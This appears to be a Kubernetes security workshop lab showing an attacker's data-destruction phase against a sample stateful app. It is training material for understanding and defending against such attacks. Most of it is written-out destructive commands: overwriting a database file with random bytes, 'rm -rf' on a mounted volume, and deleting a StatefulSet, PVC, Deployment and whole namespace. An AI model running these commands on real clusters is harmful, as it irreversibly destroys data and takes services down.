# Data Destruction

An attacker with sufficient Kubernetes API permissions can permanently destroy data and disrupt services in seconds. Kubernetes provides no built-in "are you sure?" guardrail for delete operations — a single `kubectl delete` with the wrong scope can wipe an entire namespace, its PersistentVolumeClaims, and all data stored on them, with no undo.

## Description

Attackers who have gained cluster access and escalated privileges may pivot from data theft to destruction as a final impact phase — to cover their tracks, as sabotage, or as part of a ransomware scenario. Kubernetes enables several categories of destruction:

- **Deleting Deployments and StatefulSets** immediately removes all running pods for a workload, causing an outage.
- **Deleting PersistentVolumeClaims (PVCs)** triggers the reclaim policy on the underlying PersistentVolume. With the default `Delete` policy the backing storage (EBS volume, GCE PD, etc.) is also deleted, making the data unrecoverable without a backup.
- **Deleting Namespaces** performs a cascade delete of every resource in the namespace — Pods, Services, ConfigMaps, Secrets, PVCs, and more — in a single operation.
- **Corrupting data inside a mounted volume** leaves the workload running while silently destroying its data, which is often harder to detect and recover from than an outright deletion.

## Prerequisites

- A running Kubernetes cluster (these steps use a Kind cluster named `workshop-cluster`).
- `kubectl` installed and configured to connect to your cluster.
- The attacker has `delete` permissions on the target namespace resources (Deployments, StatefulSets, PVCs, Namespaces).

## Quick Start

### Step 1 — Deploy the stateful workload

Deploy a StatefulSet with a PVC, a secondary Deployment, and a ConfigMap in a dedicated namespace:

```bash
kubectl apply -f stateful-app.yaml
```

Wait for all workloads to become ready:

```bash
kubectl rollout status statefulset/database -n stateful-app
kubectl rollout status deployment/backend-api -n stateful-app
```

Verify the data exists on the volume:

```bash
DB_POD=$(kubectl get pod -n stateful-app -l app=database -o jsonpath='{.items[0].metadata.name}')
kubectl exec -n stateful-app "$DB_POD" -- cat /data/db/records.dat
```

Expected output:

```
CRITICAL_RECORD_001: production data
CRITICAL_RECORD_002: financial transactions
```

### Step 2 — Corrupt data in the mounted volume

Before triggering visible deletions, the attacker quietly corrupts or overwrites the database files on the mounted volume. This is the most damaging technique because it may not be detected until the data is read:

```bash
DB_POD=$(kubectl get pod -n stateful-app -l app=database -o jsonpath='{.items[0].metadata.name}')

# Overwrite the records file with garbage
kubectl exec -n stateful-app "$DB_POD" -- \
  sh -c 'dd if=/dev/urandom of=/data/db/records.dat bs=1k count=10 2>/dev/null'

# Verify the corruption (file size grew from 2 lines to 10KB of random data)
kubectl exec -n stateful-app "$DB_POD" -- \
  sh -c 'wc -c /data/db/records.dat'
```

Attempt to read the now-corrupted file:

```bash
kubectl exec -n stateful-app "$DB_POD" -- cat /data/db/records.dat
```

The output is binary garbage. The file is there, the pod is running, but the data is gone.

Remove all files from the volume to simulate a wipe:

```bash
kubectl exec -n stateful-app "$DB_POD" -- sh -c 'rm -rf /data/db/*'
kubectl exec -n stateful-app "$DB_POD" -- ls /data/db/
```

Expected output: (empty — all data files deleted)

### Step 3 — Delete the StatefulSet

Take down the database StatefulSet. This terminates all pods immediately:

```bash
kubectl delete statefulset database -n stateful-app
```

Expected output:

```
statefulset.apps "database" deleted
```

Verify all database pods are gone:

```bash
kubectl get pods -n stateful-app
```

Expected output:

```
NAME                           READY   STATUS    RESTARTS   AGE
backend-api-xxxxxxxxx-xxxxx    1/1     Running   0          2m
backend-api-xxxxxxxxx-xxxxx    1/1     Running   0          2m
```

### Step 4 — Delete the PersistentVolumeClaim

With the StatefulSet deleted the PVC is now detached. Delete it to trigger storage reclamation:

```bash
kubectl delete pvc app-data-pvc -n stateful-app
```

Expected output:

```
persistentvolumeclaim "app-data-pvc" deleted
```

Verify the PVC is gone and observe the PersistentVolume reclaim status:

```bash
kubectl get pvc -n stateful-app
kubectl get pv
```

In clusters with the `Delete` reclaim policy (typical for cloud-provisioned storage) the underlying volume is permanently destroyed at this point.

### Step 5 — Delete the remaining Deployment

Delete the backend API deployment to complete the service outage:

```bash
kubectl delete deployment backend-api -n stateful-app
```

Expected output:

```
deployment.apps "backend-api" deleted
```

### Step 6 — Delete the entire namespace

A single namespace deletion cascades to every resource it contains — Pods, Services, ConfigMaps, Secrets, PVCs, and RoleBindings. This is the nuclear option:

```bash
# First, inspect what will be destroyed
kubectl get all,pvc,configmap,secret -n stateful-app

# Then delete the namespace
kubectl delete namespace stateful-app
```

Expected output:

```
namespace "stateful-app" deleted
```

Verify the namespace and all its resources are gone:

```bash
kubectl get all -n stateful-app 2>&1
```

Expected output:

```
No resources found in stateful-app namespace.
```

Or the namespace itself may already be missing:

```
Error from server (NotFound): namespaces "stateful-app" not found
```

## Cleanup

If you need to re-deploy the scenario after running through the destruction steps:

```bash
kubectl apply -f stateful-app.yaml
```

To remove all scenario resources:

```bash
kubectl delete namespace stateful-app --ignore-not-found
```

## Resources

- [Kubernetes API — Delete](https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.27/#delete-24)
- [Persistent Volumes — Reclaiming](https://kubernetes.io/docs/concepts/storage/persistent-volumes/#reclaiming)
- [Kubernetes Namespace Deletion](https://kubernetes.io/docs/tasks/administer-cluster/namespaces/#deleting-a-namespace)
- [MITRE ATT&CK for Containers — Data Destruction](https://attack.mitre.org/techniques/T1485/)
- [MITRE ATT&CK for Containers — Service Stop](https://attack.mitre.org/techniques/T1489/)
